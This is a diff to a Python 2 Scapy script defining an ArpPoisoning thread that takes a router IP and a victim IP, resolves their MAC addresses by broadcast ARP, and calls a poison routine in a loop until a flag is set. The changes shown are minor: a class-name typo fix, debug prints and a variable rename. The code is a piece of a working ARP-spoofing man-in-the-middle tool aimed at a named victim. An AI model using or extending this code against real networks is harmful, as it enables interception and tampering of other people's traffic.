@@ -6,7 +6,7 @@ import threading
 
 exitFlag = 0
 
-class ArpPoisonig(threading.Thread):
+class ArpPoisoning(threading.Thread):
     def __init__(self, routerIP, victimIP):
         threading.Thread.__init__(self)
 
@@ -16,9 +16,12 @@ class ArpPoisonig(threading.Thread):
 
     def run(self):
         self.routerMAC = self.GetMAC(self.routerIP)
+        print "routerMAC: ", self.routerMAC
         self.victimMAC = self.GetMAC(self.victimIP)
-        #getLogger("scapy.runtime").setLevel(logging.ERROR)
+        print "victimMAC: ",self.victimMAC
+        getLogger("scapy.runtime").setLevel(logging.ERROR)
         while not exitFlag:
+            print "exitFlag ", exitFlag
             self.poison()
             sleep(1.5)
         self.end()
@@ -36,8 +39,8 @@ class ArpPoisonig(threading.Thread):
 
 
     def GetMAC(self,ip):
-        answer, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=5)
-        for s, r in answer:
+        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=5)
+        for s, r in ans:
             return r[Ether].src
 
 
